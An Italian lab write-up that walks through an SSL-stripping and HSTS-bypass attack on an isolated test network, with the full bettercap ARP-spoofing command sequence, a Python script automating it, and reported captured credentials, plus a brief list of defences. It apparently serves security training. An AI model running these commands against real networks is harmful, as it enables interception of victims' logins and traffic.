# Lab 02 — SSL Stripping & HSTS Bypass

## Obiettivo
Degradare connessioni HTTPS a HTTP intercettando il traffico tramite SSL stripping in posizione MitM.

## Ambiente
| VM | IP | Ruolo |
|---|---|---|
| Kali Linux | 10.0.2.6 | Attaccante |
| Lubuntu | 10.0.2.15 | Vittima |
| pfSense | 10.0.2.1 | Gateway |

## Tool utilizzati
- `bettercap` — SSL stripping + ARP spoofing + HSTS hijack
- `wireshark` — verifica traffico HTTP risultante

## Comandi

### 1. Sequenza completa con Bettercap
```bash
sudo bettercap -iface eth0
```
Comandi interattivi:net.probe on
net.sniff on
set arp.spoof.targets 10.0.2.15
set arp.spoof.fullduplex true
arp.spoof on
set https.proxy.sslstrip true
https.proxy on
hstshijack

### 2. Script Python — automazione Bettercap
```python
import subprocess

INTERFACCIA   = "eth0"
TARGET_IP     = "10.0.2.15"
NOME_FILE_LOG = "cattura_dati.log"

comandi = [
    "events.ignore zeroconf.browsing",
    f"set events.stream.output {NOME_FILE_LOG}",
    "net.probe on",
    "sleep 7",
    "net.probe off",
    f"set arp.spoof.targets {TARGET_IP}",
    "set arp.spoof.fullduplex true",
    "arp.spoof on",
    "set https.proxy.sslstrip true",
    "https.proxy on",
    "hstshijack"
]

stringa_comandi = "; ".join(comandi)
subprocess.run(["sudo", "bettercap", "-iface", INTERFACCIA, "-eval", stringa_comandi])
```

## Attack Flow
Victim Browser  <--HTTP-->  Attacker (Kali)  <--HTTPS-->  Real Server
|
SSL Strip proxy (Bettercap)

## Risultati
- Connessioni HTTPS degradate a HTTP
- Credenziali POST intercettate in chiaro
- HSTS bypassato con hstshijack

## Concetti chiave
- SSL stripping sfrutta la prima richiesta HTTP prima del redirect HTTPS
- HSTS mitiga l'attacco ma hstshijack usa domini quasi-identici per bypassarlo
- Difesa: HSTS preloading, certificate pinning, VPN
